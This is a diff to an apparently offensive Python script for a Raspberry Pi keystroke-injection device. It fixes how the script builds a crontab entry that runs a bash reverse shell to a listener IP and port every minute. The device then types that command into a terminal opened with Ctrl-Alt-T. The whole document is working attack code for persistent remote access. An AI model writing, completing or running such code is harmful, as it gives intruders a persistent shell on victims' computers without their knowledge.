@@ -11,7 +11,6 @@ This example sets up a cronjob to execute a reverse shell every minute.
 """
 
 import os, sys, subprocess, time
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 try:
     import RPi.GPIO as GPIO
     import LCD_1in44, LCD_Config
@@ -268,12 +267,13 @@ def run_attack():
 
     # Cronjob to execute a reverse shell every minute
     revshell_cmd = f"bash -i >& /dev/tcp/{LISTENER_IP}/{LISTENER_PORT} 0>&1"
-    cron_job = f"(crontab -l 2>/dev/null; echo \\\"{cron_job}\\\") | crontab -"
+    cron_entry = f"* * * * * {revshell_cmd}" # Every minute
+    cron_job_command = f"(crontab -l 2>/dev/null; echo \\\"{cron_entry}\\\") | crontab -"
     
     try:
         hid_helper.press_modifier_key(hid_helper.keyboard.left_control, hid_helper.keyboard.left_alt, hid_helper.keyboard.t) # CTRL-ALT t
         time.sleep(0.75)
-        hid_helper.type_string(cron_job)
+        hid_helper.type_string(cron_job_command)
         hid_helper.press_key(hid_helper.keyboard.enter)
         time.sleep(0.5)
         hid_helper.type_string("exit")
